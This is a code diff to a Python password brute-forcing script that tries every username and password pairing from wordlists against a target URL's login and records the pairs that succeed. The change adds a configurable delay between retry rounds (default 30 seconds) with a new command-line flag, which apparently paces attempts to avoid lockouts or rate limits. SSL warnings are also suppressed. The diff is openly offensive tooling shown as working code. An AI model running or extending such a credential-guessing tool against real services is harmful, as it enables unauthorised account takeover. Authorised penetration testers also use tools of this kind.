@@ -5,6 +5,7 @@ from enum import Enum
 from urllib3.exceptions import InsecureRequestWarning
 
 # Disable SSL warnings
+# noinspection PyUnresolvedReferences
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 
@@ -50,7 +51,7 @@ def test_credentials(username: str, password: str, target: str) -> ResponseType:
     return ResponseType.SUCCESSFUL
 
 
-def brute_force_attack(usernames: list[str], passwords: list[str], target: str) -> list[tuple[str, str]]:
+def brute_force_attack(usernames: list[str], passwords: list[str], target: str, delay:float) -> list[tuple[str, str]]:
     potentially_correct_combinations = [(username, password) for username in usernames for password in passwords]
     known_correct_combinations = []
     while len(potentially_correct_combinations) > 0:
@@ -66,7 +67,7 @@ def brute_force_attack(usernames: list[str], passwords: list[str], target: str) 
             print(f"Request failed for username: {username}, password: {password}. Retrying...")
             potentially_correct_combinations.append((username, password))
         if len(potentially_correct_combinations) > 0:
-            time.sleep(5)
+            time.sleep(delay)
     return known_correct_combinations
 
 
@@ -76,6 +77,7 @@ def main():
     parser.add_argument("-U", "--username-list", help="Path to a file containing a list of usernames")
     parser.add_argument("-p", "--password", help="Single password")
     parser.add_argument("-P", "--password-list", help="Path to a file containing a list of passwords")
+    parser.add_argument("-d", "--delay", help="Delay between requests", type=float, default=30)
     parser.add_argument(help="Target URL", type=str, dest='target')
     args = parser.parse_args()
 
@@ -96,7 +98,7 @@ def main():
         with open(args.password_list, 'r') as f:
             passwords = [x.removesuffix('\n') for x in f.readlines()]
 
-    brute_force_attack(usernames, passwords, args.target)
+    brute_force_attack(usernames, passwords, args.target, args.delay)
 
 
 if __name__ == "__main__":
